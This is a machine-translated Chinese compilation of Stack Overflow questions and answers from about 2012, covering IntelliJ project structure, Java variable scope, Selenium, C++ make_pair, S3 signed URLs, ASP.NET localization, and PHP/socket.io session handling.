我可以建议一些事情吗？首先，使用数据类型`xsd:date`，甚至`xsd:dateTime`用于结婚日期和出生日期。使用 YYYY-MM-DD 模式来命名实体，因为如果按字典顺序排序，则会按时间顺序对它们进行排序。使用一致的命名约定，例如，`hasWife`and`hasHusband`而不是`hasWife`and `husband`。“Marriage”在英文中有两个“r”。在向人们展示您的数据时使用有意义的前缀。更好的是，使用对人类友好的语法，例如 Turtle。

```
fam:BrunoCatherine  a  fam:Marriage;
    fam:dateOfMarriage  "2011-07-25"^^xsd:date;
    fam:hasWife  fam:Catherine1982-03-20;
    fam:hasHusband  fam:Bruno1980-06-15 .
fam:Catherine1982-03-20  fam:dateOfBirth  "1982-03-20"^^xsd:date;
    fam:hasLastName  "Gomez";
    fam:hasFirstName  "Catherine" .
fam:Bruno1980-06-15  fam:dateOfBirth  "1980-06-15"^^xsd:date;
    fam:hasLastName  "Jeandet";
    fam:hasFirstName  "Bruno" . 
```

是不是更好看？

# intellij-idea - 如何将非源文件夹添加到 IntelliJ IDEA 项目

> ID：12192919
> 
> 赞同：40
> 
> 时间：2012-08-30T08:34:40.513
> 
> 标签：intellij-idea

最近在 IntelliJ 中建立了一个多模块项目，结构如下：

```
/module1
/module2
/web-module
/sql
/lib
/a few more folders 
```

我在 IntelliJ 中将 module1+2 和 web-module 设置为模块，所以它们会显示出来，但是如何让 sql 和 lib 文件夹显示在项目面板中？它们也应该包含在 VCS 中，但 IntelliJ 会忽略它们。如何将模块外的文件夹添加到项目中？

项目和资源管理器视图的屏幕截图：

![](../Images/d7e836adc5dbfa6f0f816e639716a3eb.png)

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2015-08-03T14:11:01.157

这不是对这个问题的严格回答，但它对我有用，所以我发布了，也许有人会觉得这很有用。

**如果您想将任意文件夹添加到您的项目**（即使是从与您的项目不同的位置），只需将其添加为模块即可。您不必太担心类型，例如我需要添加一个包含一些 SQL 脚本的文件夹，我将它添加为一个 Java 模块，即使它没有 maven 结构或 Java 源代码，它在 IntelliJ 中也很容易看到。

这是如何做到的：

*   文件 > 项目结构 > 模块
*   添加 > 新模块 > ...（例如 Java 模块）
*   在新模块设置中，将要查看的子文件夹标记为“源”

瞧！:)

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2016-03-10T20:12:00.883

这是我在从现有模块创建项目时通常会看到的内容。所有模块都将显示在项目中，但不显示其他与项目相关的目录。这些目录可能是配置文件、环境脚本或不适合 Intellij 模块类型的 SQL 脚本包。

为了显示其余的项目源文件和目录，我从项目根目录创建了一个父模块。

文件->项目结构->模块

1.  使用 + 号创建一个新模块。新模块可以是任何类型（我使用 java）。
2.  在**Next**屏幕上，将**Content root**和**Module 文件位置**设置为项目的根文件夹。
3.  选择**完成**

您的所有其他模块现在应该是根的子模块，并且您的其他项目文件现在应该显示出来。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2018-04-21T13:03:03.400

添加和删​​除内容根

要添加新的内容根：

1.  转到文件 | 项目结构，或按 Ctrl+Shift+Alt+S。
2.  在项目设置部分下选择模块。
3.  选择必要的模块，然后打开对话框右侧的 Sources 选项卡。
4.  单击添加内容根。
5.  指定要添加为新内容根目录的文件夹，然后单击“确定”。

[![在此处输入图像描述](../Images/388b10d8094145796a15797f78b3eff4.png)](https://i.stack.imgur.com/apWhD.png)

来源：[https ://www.jetbrains.com/help/idea/creating-and-managing-modules.html](https://www.jetbrains.com/help/idea/creating-and-managing-modules.html)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2016-11-08T08:33:58.047

我用了`File -> New -> Module from Existing Sources...`

[![在此处输入图像描述](../Images/c388cb7ad530515e179df07e3dca1e1c.png)](https://i.stack.imgur.com/60ll7.jpg)

然后我只需选择文件夹并添加它。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-08-30T08:38:47.190

在项目视图模式下，所有目录（设置中忽略的目录除外）都应显示。当然，您的多项目的基本文件夹必须是 module1 上方的文件夹。

![在此处输入图像描述](../Images/9d18d9482844c291ac79a3c0444d316d.png)

编辑：

您的项目应如下所示（项目视图树）：

```
MY_PROJECT_ROOT (~/the/folder/to/your/project)
     |- /module1
     |- /module2
     |- /web-module 
```

在这种情况下，您绝对应该看到其他文件夹。我在其中设置了一个示例项目。

编辑2：

从您的屏幕截图中，我假设您缺少根目录（项目根目录与您的预期不同）。我添加了另一个屏幕截图。您的 3 个模块应该有一个根文件夹。您的屏幕截图中缺少这个。您有 3 个单独的文件夹，没有共同的根文件夹。在 MacOs 上，项目根目录显示在窗口标题中。就我而言，它指向`~/devel/sandbox`. 我想您应该尝试在该`trunk`文件夹中创建一个新项目。从头开始。然后添加现有的模块，你应该没问题？！

![在此处输入图像描述](../Images/be30349696d42ec6f47b1eb928f67d2d.png)

# linux - 如何在 USB 大容量存储模式下列出通过手机连接到 Linux 的 SD 卡的内容？

> ID：12192920
> 
> 赞同：2
> 
> 时间：2012-08-30T08:34:41.623
> 
> 标签：linux, mobile, usb, sd-card, usb-mass-storage

当作为 USB 大容量存储设备连接时，是否可以从 SD 卡获取文件列表？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T09:39:34.163

UMS 将 SD 卡的内容作为原始存储设备提供，与硬盘驱动器或 CD 驱动器非常相似。因此，由操作系统的 VFS 来理解其中包含的分区、格式化和目录结构。

# c# - 如何将列表和字典作为元素添加到列表中

> ID：12192923
> 
> 赞同：1
> 
> 时间：2012-08-30T08:34:48.190
> 
> 标签：c#, list

有什么方法可以在不使用的情况下将字典和列表添加到列表中`List<Object>`？

```
list.add(someList);
list.add(someDict); 
```

编辑：为什么我需要它？这也是我的第一个想法^^。因为我收到了那种物品，我“应该”使用它们。我需要钥匙来检查特定钥匙的价值。

我想这就是结构：

```
List<String> list1 = new List<String>();
Dictionary<String,String> dict1= new Dictionary<String,String>();

list.add(list1);
list.add(dict1); 
```

EDIT2：**迭代时它必须有很棒的性能！**我不确定 Object 的表现如何。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-30T08:36:17.733

是的，您可以使用`List<IEnumerable>`. 不过，如果这样更好，还有待商榷。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:37:44.197

你可以列出一个清单`IEnumerable`，但*为什么*呢？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-30T08:49:21.130

如果您将and`List<T>`指定`T`为公共基础，则可以将列表和字典存储在另一个列表中，因此以下内容将 and 都存储`List<T>`在一个列表中：`Dictionary<TKey, TValue>``List<T>``Dictionary<TKey, TValue>`

*   `List<ICollection>`
*   `List<IEnumerable>`
*   `List<object>`

通过“性能”，我假设您的意思是不需要演员？对我来说，这目前是荒谬的，你的问题似乎是一个[X/Y 问题](http://www.perlmonks.org/?node_id=542341)的演示——你没有告诉我们你想要实现什么，你已经决定了你想要如何实现它并且正在询问一些关于它的问题。

就我个人而言，我假设无论这是什么，它都可能是错误的方法。

# android - 开始活动表现

> ID：12192928
> 
> 赞同：0
> 
> 时间：2012-08-30T08:35:09.500
> 
> 标签：android

我的应用程序在活动之间开始变得非常缓慢，并且从我运行 StartActivty 到该活动开始时的 onCreate 开始进行调查，最多可能需要 1000 毫秒

谁能告诉我这可能是什么

我试图删除 oncreate 中的所有内容，但不是这样。它只是在它运行 onCreate 之前的 800 毫秒到 1000 毫秒

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-18T13:04:02.423

如果您在 4.x 设备中运行应用程序。请设置 -> 开发人员选项 -> 不要启用或不启用活动。如果启用它，您的应用程序可能会很慢。请检查选项。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T08:40:11.867

原因可能隐藏在您的 xml 布局文件中。Xml 解析本身就是资源消耗。所以检查一下。

# assembly - 来自站点的多任务示例

> ID：12192935
> 
> 赞同：1
> 
> 时间：2012-08-30T08:35:20.360
> 
> 标签：assembly, x86

这是我一直在看的材料 [http://hosted.cjmovie.net/TutMultitask.htm](http://hosted.cjmovie.net/TutMultitask.htm)

如果有人可以帮助我完成以下汇编代码，不胜感激

```
pusha          ;Push all standard registers
push ds        ;Push segment d
push es        ;Push segmetn e
push fs        ; ''
push gs        ; '' 
```

寄存器和段保存在进程的内核级堆栈中，对吗？

```
mov eax, 0x10  ;Get kernel data segment
mov ds, eax    ;Put it in the data segment registers
mov es, eax
mov fs, eax
mov gs, eax 
```

加载内核数据段描述符的目的是什么？

```
push esp       ;Push pointer to all the stuff we just pushed
call _TaskSwitch ;Call C code 
```

为什么调用_TaskSwitch之前保存了esp？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-01T05:31:22.063

代码在注释中清楚地说明了这一点：“将指针指向我们刚刚推送的所有内容”+“调用 C 代码”，另请参见`TaskSwitch()`：

```
//Switch between our two tasks
//Notice how we get the old esp from the ASM code
//It's not a pointer, but we actually get the ESP value
//That way we can save it in our task structure
unsigned int TaskSwitch(unsigned int OldEsp) 
```

因此，`TaskSwitch()`接收（作为参数）ISR 在堆栈上保存的上下文的地址或指针。`TaskSwitch()`还返回保存在堆栈上的某个上下文的指针/地址。如果它返回与接收到的相同的值，则不会发生切换，这是一个简单的调用+返回。如果它返回一个不同的，就会发生切换，因为返回是使用不同的上下文和不同的地址完成的。

阅读您所指的文档以及其中描述的代码。那里都写得很清楚。

# css - 不包括“粗体”或“斜体”谷歌字体，如果我使用它们似乎可以正常工作

> ID：12192938
> 
> 赞同：2
> 
> 时间：2012-08-30T08:35:29.237
> 
> 标签：css

当我在我的网站中包含 Google 字体并且只包含 Normal 400 粗体时，我仍然可以使用粗体、斜体等粗体，尽管它并没有真正包含在内。

这是一个小提琴：http: [//jsfiddle.net/9nYZb/](http://jsfiddle.net/9nYZb/)

```
<link href='http://fonts.googleapis.com/css?family=PT+Serif' rel='stylesheet' type='text/css'> 
```

对比

```
<link href='http://fonts.googleapis.com/css?family=PT+Serif:400,700,400italic' rel='stylesheet' type='text/css'> 
```

为什么是这样？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-30T08:40:54.033

浏览器将通过简单地使标准字体变粗或倾斜来模拟粗体和斜体字体。

如果比较两者，您会发现包含粗体和斜体字体的字体看起来更好。

![在此处输入图像描述](../Images/19ca9437f686f64535da033b9826c151.png)

# groovy - 如何为 Groovy 程序创建协作图？

> ID：12192940
> 
> 赞同：3
> 
> 时间：2012-08-30T08:35:35.067
> 
> 标签：groovy, doxygen

我想知道是否有一种方法可以像 Doxygen 为 Java 等那样为 Groovy 程序生成协作图。我尝试运行 Doxygen，但它似乎无法解析 Groovy 文件（或者我得到了错了吗？）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T12:45:57.153

您可以从 IntelliJ 内部生成图表。它们看起来像这样：

![在此处输入图像描述](../Images/0c38a6d5930c24683b65b913f68f1cd9.png)

* * *

**编辑**

我认为在 groovy 中创建正确的协作图非常困难（也许是不可能的），因为它是一种带有鸭子类型的动态语言。

如何在协作图中说明这些类：

```
class Cage {
    private def bird

    Cage(bird) {
        this.bird = bird
    }

    def shake() {
        bird.sing()
    }
}

class Dog {
    def sing() {
        println 'Woof'
    }
}

class Main {
    static void main(String[] args) {
        Cage cage = new Cage(new Dog())
        cage.shake()
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T09:12:30.267

根据[doxygen 手册，](http://www.doxygen.nl/manual/starting.html)*不*支持Groovy （支持的语言有 C、C++、C#、Objective-C、IDL、Java、VHDL、PHP、Python、Tcl、Fortran 和 D）。根据[常见问题解答](http://www.doxygen.nl/manual/faq.html)的问题 12，如果您尝试记录不受支持的语言，则必须修改 doxygen 源。

如果 Groovy 类似于其中一种语言（我从未使用过 Groovy），那么您可以尝试使用这些现有的解析器之一来尝试解析 Groovy 源代码。为此，您需要配置 doxygen 以在具有`.groovy`扩展名的文件上运行正确的解析器（这是 groovy 文件的正确扩展名吗？）。您可以通过将[`EXTENSION_MAPPING`](http://www.doxygen.nl/manual/config.html#cfg_extension_mapping)doxygen 配置文件中的配置选项设置为

```
EXTENSION_MAPPING += groovy=Java 
```

这告诉 doxygen 对任何带有扩展名的文件使用 Java 解析器`.groovy`。

# java - 如何使用 Java 获取带有 Selenium WebDriver 的父 HTML 标记

> ID：12192941
> 
> 赞同：26
> 
> 时间：2012-08-30T08:35:38.250
> 
> 标签：java, selenium, selenium-webdriver

我有一个搜索`<span class="legend">`. 在上一个级别上，我有一个包含多个值的字段集。这是我的问题。我没有得到这个字段集的定位器。

首先，我得到一个包含所有`class=legend`对象的列表：

`List<WebElement> groupList = driver.findElements(By.className("legend"));`

这很好用，我有一个包含几个 Webelements 的列表。

现在我想迭代这个列表并只保存上一级字段集中的每个值。问题是 Selenium 找不到字段集的 id。

我试图`tempGroupElement.getAttribute("id")`获取ID，但它不起作用。

任何想法？

* * *

## 回答 #1

> 赞同：44
> 
> 时间：2012-08-30T10:09:02.223

我在 C# 中有一个方法。

```
public static IWebElement GetParent(IWebElement e)
{
   return e.FindElement(By.XPath(".."));
} 
```

希望能帮助到你 ：）

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2013-01-04T09:11:03.497

您可以使用`WebElement.findElement(By.xpath("parent::*"))`

我试过了，它在硒中有效。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2015-12-04T16:59:19.153

这将在 IWebElement 之上创建一个扩展，让您可以直接在子 IWebElement 上调用 GetParent

```
public static class MyExtensions
{
    public static IWebElement GetParent(this IWebElement node)
    {
        return node.FindElement(By.XPath(".."));
    }
} 
```

示例用法...

```
IWebElement node = WebDriver.FindElement('..');
IWebElement parent = node.GetParent(); 
```

# installation - 是什么导致终端进入循环输出“？您必须在 rhc 设置中输入 Openshift 登录后输入有效的 HighLine::String”？

> ID：12192943
> 
> 赞同：2
> 
> 时间：2012-08-30T08:35:44.353
> 
> 标签：installation, openshift, openshift-client-tools

[我已按照此处](https://openshift.redhat.com/community/get-started)在 Mac 上设置 Openshift 的说明进行操作，但是当我到达第 2 步并编写我的 Openshift 登录时，终端会进入一个循环并输出

```
"? You must enter a valid HighLine::String". 
```

有谁知道那可能是什么？

编辑：根据要求，这是终端输出的复制/粘贴：

> $ rhc 设置
> 
> 为 OpenShift 的命令行界面启动交互式设置
> 
> 我们将通过几个问题帮助您进行设置。你可以通过复制你的配置来跳过这个：
> 
> ```
> /Users/videre/.openshift/express.conf
> /Users/videre/.ssh/ 
> ```
> 
> 要连接到 openshift.redhat.com，请输入您的 OpenShift 登录名（电子邮件或 Red Hat 登录 ID）：

输入id后，我得到以下的无限循环：

> ? 您必须输入有效的 HighLine::String。

如果它有任何用途/兴趣，这里是请求 rhc 版本时的输出：

> $ 宝石清单 rhc
> 
> *** 当地宝石 ***
> 
> rhc (0.97.17)

编辑 2

高线版本：

> $ 宝石列表高线
> 
> *** 当地宝石 ***
> 
> 高线（1.6.14、1.5.0）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-05T20:03:34.990

它可能是 highline 的旧版本 - 您可以执行“gem list highline”来查看您拥有的版本吗？

编辑：您描述的类似问题已在 highline 1.6.8 中修复，此链接[http://www.dahotre.com/programmings/capistrano-problem-must-enter-valid-highline-string](http://www.dahotre.com/programmings/capistrano-problem-must-enter-valid-highline-string)描述了类似问题。

你可以试试以下

```
gem install highline --version 1.6.13
gem uninstall highline --version 1.6.14 
```

看看是否能解决您的问题？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T15:42:26.107

其他人`highline-1.6.14`在另一个应用程序中看到了这个问题。

你可以试试这个：

```
gem uninstall highline --version 1.6.14
gem install highline --version 1.6.13 
```

# java - JAVA - 如何从 for 循环外部访问 FOR 循环内的变量

> ID：12192947
> 
> 赞同：2
> 
> 时间：2012-08-30T08:36:11.763
> 
> 标签：java, for-loop

我的代码是将 RSS 提要添加到列表中 - 代码最初只是从列表中的第一个位置拉出一个提要，然后将此对象添加到另一个列表中。

这是原始代码：

```
public static List<Feed> getFeedsFromXml(String xml) {
      Pattern feedPattern = Pattern.compile("<feed>\\s*<name>\\s*([^<]*)</name>\\s*<uri>\\s*([^<]*)</uri>\\s*</feed>");

      Matcher feedMatch = feedPattern.matcher(xml);
      while (feedMatch.find()) {
          String feedName = feedMatch.group(1);
          String feedURI = feedMatch.group(2);
          feeds.add(new Feed(feedName, feedURI));
      }

      return feeds;
}

@POST
@Consumes(MediaType.APPLICATION_XML)
@Produces(MediaType.APPLICATION_XML)
public String addXmlFeed() throws IOException
{
    int i = 0;
    String stringXml = "<feed><name>SMH Top Headlines</name><uri>http://feeds.smh.com.au/rssheadlines/top.xml</uri></feed><feed><name>UTS Library News</name>";
    getFeedsFromXml(stringXml);
    Feed f = (Feed) feeds.get(0);
    feedList.add(f);
    String handler = "You have successfully added: \n"; 
    String xmlStringReply = "" + f + "\n";

    feedList.save(feedFile);
    return handler + xmlStringReply;

} 
```

一切进展顺利，然后我决定实现一个 for 循环来处理将多个提要添加到列表中，然后我尝试了以下方法（仅涉及第二种方法的代码）：

```
@POST
@Consumes(MediaType.APPLICATION_XML)
@Produces(MediaType.APPLICATION_XML)
public String addXmlFeed() throws IOException
{
    int i = 0;
    String stringXml = "<feed><name>SMH Top Headlines</name><uri>http://feeds.smh.com.au/rssheadlines/top.xml</uri></feed><feed><name>UTS Library News</name>";
    getFeedsFromXml(stringXml);
    for (Feed feed: feeds)
    {
        Feed f = (Feed) feeds.get(i++);
        feedList.add(f);
        String handler = "You have successfully added: \n"; 
        String xmlStringReply = "" + f + "\n";
    }

    feedList.save(feedFile);
    return handler + xmlStringReply;

} 
```

现在我确定这是一个基本问题，但现在排在一行：

```
 return handler + xmlStringReply; 
```

`handler`并且`xmlStringReply`无法解析为变量，因为它们位于 FOR LOOP 中。

有什么简单的方法可以解决这个问题吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-30T08:37:42.090

这两个变量的范围仅限于 for 循环。要在循环外访问它们，您需要通过在循环之前声明它们来增加它们的范围：

```
String handler = ""; 
String xmlStringReply = "";
for (Feed f: feeds) {
    feedList.add(f);
    handler = "You have successfully added: \n"; 
    xmlStringReply = "" + f + "\n";
}

feedList.save(feedFile);
return handler + xmlStringReply; 
```

此外，您当前的代码会在每个循环中覆盖字符串的值，而您可能打算连接这些值。在这种情况下，您可以使用 StringBuilder 而不是字符串连接：

```
StringBuilder xmlStringReply = new StringBuilder("You have successfully added: \n");
for (Feed f: feeds) {
    feedList.add(f);
    xmlStringReply.append(f + "\n");
}

feedList.save(feedFile);
return xmlStringReply.toString(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-30T08:39:28.890

因为，现在他们已经超出了范围。

除了原始错误——您可以使用其他建议轻松修复该错误，我建议您不要将`feeds`其设为实例变量。我可以看到您的方法`getFeedsFromXml()`正在返回列表。因此，我认为如果您在该方法中定义该变量会更好。然后，像这样调用方法，

```
List<Feed> feeds = getFeedsFromXml(stringXml); 
```

或者，如果这没有给您所需的行为，那么您应该将该方法重命名为`loadFeedsFromXml()`. **将其作为实例变量可能会导致线程问题**。

现在，尝试改进你的循环，

```
StringBuilder xmlStringReply = new StringBuilder("You have successfully added: \n");
for (Feed feed: feeds) {
    feedList.add(feed);
    xmlStringReply.append(f + "\n");
}

feedList.save(feedFile);
return xmlStringReply.toString(); 
```

而且，我发现你`feedList`的也是一个实例变量。这又会导致线程问题，因为它听起来不是不可变的或无状态的。同步这些方法会给您带来性能问题。看看你是否可以使它成为这个方法的本地。**一个经验法则是尽可能缩小变量范围**。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-30T08:39:48.313

您需要将结果累积到一个变量中。我正在使用它是`StringBuilder`因为它使字符串连接变得高效。

```
@POST
@Consumes(MediaType.APPLICATION_XML)
@Produces(MediaType.APPLICATION_XML)
public String addXmlFeed() throws IOException
{
    String stringXml = "<feed><name>SMH Top Headlines</name><uri>http://feeds.smh.com.au/rssheadlines/top.xml</uri></feed><feed><name>UTS Library News</name>";
    getFeedsFromXml(stringXml);

    StringBuilder replyBuilder = new StringBuilder("You have successfully added: \n");
    for (Feed feed : feeds)
    {
        feedList.add(feed);

        String xmlStringReply = feed  + "\n";
        reployBuilder.append(xmlStringReply); 
    }

    feedList.save(feedFile);
    return replyBuilder.toString();    
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-30T08:47:47.457

**您**需要回答的问题是“如果我添加多个提要，我想返回什么？”。

也许你想回来`"You have successfully added : feed1 feed2 feed3\n"`

在这种情况下，代码是：

```
 StringBuilder response = new StringBuilder( "You have successfully added: ");
            for (Feed feed: feeds)
                {
                    feedList.add(feed);
                    response.append(f.toString()).append(" ");
                }
            feedList.save(feedFile);
            return response.toString(); 
```

* * *

**顺便说一句**，你的`feed`和`f`变量是一样的而且是多余的！

不要写：

```
int i = 0;    
for (Feed feed: feeds)
{
    Feed f = (Feed) feeds.get(i++);
    feedList.add(f);
} 
```

但

```
for (Feed feed: feeds)
{
    feedList.add(feed);
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-30T13:41:46.053

一个好的经验法则是像这样查看范围：

```
 { //This is a constructor

  int i;

} // This is a deconstructor 
```

在 curlies 之间创建/实例化的任何内容都只存在于 curlies 内。每当您使用变量和循环时：

```
for(int i = 0; i < 10; i++){

 //some code here
 } // after this curly i is no longer in scope or accessible. 
```

# amazon-s3 - 如何让我的 Amazon S3 编码函数了解存储桶内的子文件夹？

> ID：12192949
> 
> 赞同：1
> 
> 时间：2012-08-30T08:36:14.617
> 
> 标签：amazon-s3

我编写了以下函数来编码我的 S3 链接，以便它们处理亚马逊的 S3 编码系统来保护链接。问题是它只有在文件在存储桶中时才有效。如果我在存储桶中创建一个子文件夹并将文件粘贴在那里，它就不起作用。我究竟做错了什么？

```
function encodeS3($sURL,$sAccessKey,$sSecretKey,$nExpireMinutes = 5) {
  $sFile = basename($sURL);
  $sBucket = basename(str_replace('/' . $sFile,'',$sURL));
  $asQuery = array(
    'AWSAccessKeyId' => $sAccessKey,
  );
  $nExpireSecs = absint( $nExpireMinutes ) * 60;
  $nExpireSecs = time() + absint( $nExpireSecs );
  $asQuery[ 'Expires' ] = $nExpireSecs;
  $sAmazonText = "GET\n\n\n{$nExpireSecs}\n/{$sBucket}/{$sFile}";
  $asQuery[ 'Signature' ] = urlencode( base64_encode( ( hash_hmac( 'sha1', utf8_encode( $sAmazonText ), $sSecretKey, TRUE ) ) ) );
  $s = add_query_arg( $asQuery, "https://s3.amazonaws.com/{$sBucket}/{$sFile}" );
  return esc_url($s);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T09:09:08.020

我只需要更改解析 URL 的方式。

```
function encodeS3($sURL,$sAccessKey,$sSecretKey,$nExpireMinutes = 5) {
  /*
  $sFile = basename($sURL);
  $sBucket = basename(str_replace('/' . $sFile,'',$sURL));
  */
  $sURL = str_replace('https://','',$sURL);
  $sURL = str_replace('http://','',$sURL);
  $sURL = str_replace(urlencode('https://'),'',$sURL);
  $sURL = str_replace(urlencode('http://'),'',$sURL);
  $asParts = explode('/',$sURL);
  array_shift($asParts);
  $sBucket = array_shift($asParts);
  $sFile = implode('/',$asParts);

  $asQuery = array(
    'AWSAccessKeyId' => $sAccessKey,
  );
  $nExpireSecs = absint( $nExpireMinutes ) * 60;
  $nExpireSecs = time() + absint( $nExpireSecs );
  $asQuery[ 'Expires' ] = $nExpireSecs;
  $sAmazonText = "GET\n\n\n{$nExpireSecs}\n/{$sBucket}/{$sFile}";
  $asQuery[ 'Signature' ] = urlencode( base64_encode( ( hash_hmac( 'sha1', utf8_encode( $sAmazonText ), $sSecretKey, TRUE ) ) ) );
  $s = add_query_arg( $asQuery, "https://s3.amazonaws.com/{$sBucket}/{$sFile}" );
  return esc_url($s);
} 
```

顺便说一句，上面使用了一些仅在 WordPress 中可用的功能。如果您需要直接的 PHP，则必须对其进行调整。

# c# - 在 Cookies 或 Session (ASP.Net MVC 3) 中保存本地化？

> ID：12192954
> 
> 赞同：2
> 
> 时间：2012-08-30T08:36:25.707
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-3

在我的 ASP.Net MVC 3 应用程序中，我实现了本地化。我将用户的本地化保存在 cookie 中。在我的应用程序中，我有认证。在 cookie 或会话中保存本地化的最佳方法是什么（会话为 2880 秒，因为在`web.config`此时间后用户应再次在应用程序中选择它的语言）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-30T08:49:12.007

ASP.NET 会话和 cookie 取决于浏览器，因此当用户更改浏览器时，他将不得不再次选择语言。您可以在数据库中创建设置并允许用户在配置文件中选择语言。在这种情况下，您无需在每次更改浏览器时重新选择语言。
同时，您可以使用 cookie 在本地存储语言，因此当用户未登录时，将应用来自 cookie 的语言。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:41:33.913

LocalStorage 是存储应用程序设置的好地方，您希望在会话之间保留这些设置（而不是 sessionStorage），而不是传输到服务器（而不是 cookie）。以前，为了避免将基于 cookie 的设置不必要地传输到服务器，您必须为 cookie 使用不同的子域。

# c++ - 使用模板时的类型推断

> ID：12192955
> 
> 赞同：3
> 
> 时间：2012-08-30T08:36:31.013
> 
> 标签：c++, templates, types, inference

所以这就是我想做的事情：我使用`std::pair`，但我肯定想使用元组做同样的事情，或者实际上几乎任何类型的模板。分配对变量时，我需要输入如下内容：

```
T1 t1;
T2 t2;
std::pair<T1,T2> X;
X = std::pair<T1,T2> (t1, t2); 
```

有没有办法`<T1,T2>`在创建新对时省略第二个，让编译器猜测，或者使用 X 的类型（我显然试图创建一个`pair<T1,T2>`）或`t1`和`t2`的类型（我正在使用一个`T1`对象和一个`T2`对象，我想要的那对有可能是类型`pair<T1,T2>`）？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-30T08:38:48.127

是的，使用`std::make_pair`：

```
std::pair<T1,T2> X;
// some code
X = std::make_pair( t1, t2 ); 
```

或者，如果您可以直接初始化它：

```
std::pair<T1,T2> X = std::make_pair( t1, t2 ); // OR, even better:
std::pair<T1,T2> X( t1, t2 ); 
```

* * *

对于 C++11，初始化更好：

```
auto X = std::make_pair( t1, t2 ); 
```

任务是一样的：

```
X = std::make_pair( t1, t2 ); 
```

但也可能是：

```
X = { t1, t2 }; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-30T08:39:05.957

是的，但模板参数推导仅适用于函数模板，不适用于类模板的构造函数。为此，该库提供了一个功能：

```
X = std::make_pair(t1, t2); 
```

在 C++11 中，对和元组可以从初始化列表中初始化和分配：

```
X = {t1, t2}; 
```

或`auto`可用于从初始化程序自动指定类型，因此您根本不需要指定模板参数：

```
auto X = std::make_pair(t1, t2); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-30T08:38:38.080

```
std::pair<T1,T2> X = std::make_pair(t1, t2); 
```

或与`C++11`

```
std::pair<T1, T2> X = {t1, t2}; 
```

或与`C++11`

```
auto X = std::make_pair(t1, t2); 
```

因为`std::tuple`有`std::make_tuple`。

# php - PHP + socket.io（会话、授权和安全问题）

> ID：12192957
> 
> 赞同：12
> 
> 时间：2012-08-30T08:36:38.623
> 
> 标签：php, security, node.js, authentication, socket.io

我有一个工作的 php 应用程序，我想在其中添加实时支持。我想使用 nodejs/socket.io 来添加这种功能。

我发现的第一个问题是如何在 nodejs 端正确授权用户（用户已经通过 PHP 会话在 php 后端进行了身份验证）。在 nodejs 端使用**socket.handshake.header.cookie**我可以解析并获取 PHP 会话 ID，我可以通过 redis/memcache/database 进行身份验证（取决于我用来保存会话信息的内容）。
当用户只打开网站的一个标签/窗口时，一切看起来都很酷 - 当拥有更多并使用**session_regenerate_id()**，在 nodejs 中，用户使用另一个 sessionid 密钥进行身份验证，因此除了它们连接的套接字 id 之外，我无法区分两个选项卡。当用户注销时，他不应该在任何选项卡上收到任何消息（因为他已经从该浏览器的每个选项卡/窗口上注销）。所以在注销消息（在注销 PHP 之前从浏览器发送）我应该删除所有连接到授权用户 ID 的套接字连接。但是如果用户在两个设备上登录（fe. pc 浏览器和 ipad safaris）会怎样。在一台设备上注销后，他不应该在他注销的设备上收到任何消息，而不是在每台设备上。**如何区分来自 socket.io 中不同设备/浏览器的连接？**当然不使用**session_regenerate_id()**在这里会很有效，但是如果我真的想使用此功能该怎么办？

我遇到的另一个问题是安全问题（甚至是问题）。假设应用程序中的授权用户可以看到页面**example.com/user1**（这是 user1 的新闻提要）并且看不到**example.com/user2**（他没有权限查看它）。**当用户在example.com/user1**时，我希望 socket.io 向浏览器发送更新消息，当然当用户在**example.com/user2**站点时不发送。在 socket.io 方面，我可以读取引用地址（因此推测，当用户在 user2 站点上时，他没有得到任何 socket.io 连接）。问题是：**我应该将引用地址与 node.js 端经过身份验证的用户的权限进行比较吗？或者，在 node.js 端，referer 值可能是*安全的？***在 node.js 端添加另一个数据库检查会减慢速度（因为几乎每个请求都应该在两侧进行相同的数据库检查 - PHP 和 node.js）。

或者也许我提出的 socket.io + PHP 应用程序的整个概念是错误的？

**更新**

我想我找到了一种方法来省略第一个问题的问题 - 基本上我只是添加另一个 cookie（除了 PHPSESSID）fe。命名为 NODESESSID，我在授权用户时生成（fe. 使用 uniqid()）。现在 node.js 端的授权正在比较 PHPSESSID 和 NODESESSID（两者必须匹配）。现在，当用户注销时，他将消息*logout*传递到 socket.io 并且 socket.io 断开所有带有 NODESESSID 的套接字。这就像连接重新生成会话 ID 和不重新生成会话 ID 的好处（但不容易受到会话固定的影响，不是吗？）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-05T11:33:09.657

对于您的第二个问题：

如评论中所述，Referer 不安全。

我的应用程序中有一个类似的问题，这就是它对我的工作方式。

